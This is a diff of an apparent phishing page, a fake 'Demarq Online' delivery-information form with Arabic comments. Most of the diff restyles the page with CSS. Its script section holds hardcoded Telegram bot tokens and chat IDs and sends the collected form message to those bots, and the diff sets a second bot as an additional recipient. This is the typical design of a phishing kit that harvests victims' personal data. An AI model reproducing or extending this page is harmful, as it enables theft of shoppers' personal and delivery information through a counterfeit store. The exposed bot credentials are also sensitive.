@@ -5,7 +5,116 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Informations de Livraison - Demarq Online</title>
     <style>
-        /* نفس التنسيق السابق */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f4f6f9; color: #222; }
+
+        /* شريط الرسالة العلوي */
+        .top-bar {
+            background-color: #5ac3d1;
+            color: white;
+            padding: 8px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .top-bar span {
+            background-color: #e6005c;
+            color: white;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+
+        /* رأس الصفحة */
+        header {
+            background-color: #003f5f;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .search {
+            flex: 1;
+            margin: 0 20px;
+            position: relative;
+        }
+
+        .search input {
+            width: 100%;
+            padding: 10px 15px;
+            border-radius: 30px;
+            border: none;
+        }
+
+        .cart {
+            font-weight: bold;
+            font-size: 15px;
+        }
+
+        /* الحاوية الرئيسية */
+        .container {
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #003f5f;
+            margin-bottom: 20px;
+        }
+
+        .form-section {
+            margin-top: 20px;
+        }
+
+        .form-section label {
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .form-section input, .form-section select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        .form-section .submit-btn {
+            background-color: #e6005c;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            text-align: center;
+            width: 100%;
+            border-radius: 5px;
+            border: none;
+            margin-top: 20px;
+        }
+
+        .form-section .submit-btn:hover {
+            background-color: #c0392b;
+            cursor: pointer;
+        }
+
+        .form-section .required {
+            color: red;
+            font-size: 14px;
+        }
+
     </style>
 </head>
 <body>
@@ -95,9 +204,9 @@
             
             // التوكنات والمعرفات الخاصة بالبوتات
             const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
-            const bot2Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+            const bot2Token = '7238919189:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
             const bot1Id = '5372119436';
-            const bot2Id = '5372119436';
+            const bot2Id = '5372111022';
             
             // إرسال البيانات إلى البوت الأول
             sendToTelegram(bot1Token, bot1Id, message);
